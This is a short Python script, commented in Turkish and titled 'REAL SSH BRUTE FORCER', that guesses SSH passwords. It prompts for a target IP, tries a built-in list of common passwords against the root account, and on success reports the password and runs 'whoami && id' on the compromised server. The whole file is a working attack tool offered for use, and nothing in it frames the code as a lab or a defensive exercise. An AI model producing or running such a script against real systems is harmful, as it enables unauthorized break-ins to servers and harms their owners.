import paramiko
import time

print("--- REAL SSH BRUTE FORCER ---")

target_ip = input("Hedef IP: ")
username = "root" # Veya hedef kullanıcı adı
wordlist = ["123456", "password", "root", "admin", "kali", "toor"]

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, port=22, username=username, password=password, timeout=3)
        print(f"\n[+] ŞİFRE KIRILDI: {password}")
        
        # İçeri girince komut çalıştır
        stdin, stdout, stderr = ssh.exec_command("whoami && id")
        print(f"[+] Sunucu Cevabı: {stdout.read().decode().strip()}")
        return True
    except:
        print(f"[-] Deneniyor: {password} (Başarısız)")
        return False
    finally:
        ssh.close()

print(f"[*] Saldırı Başlıyor: {target_ip} ({username})")
for password in wordlist:
    if ssh_connect(password):
        break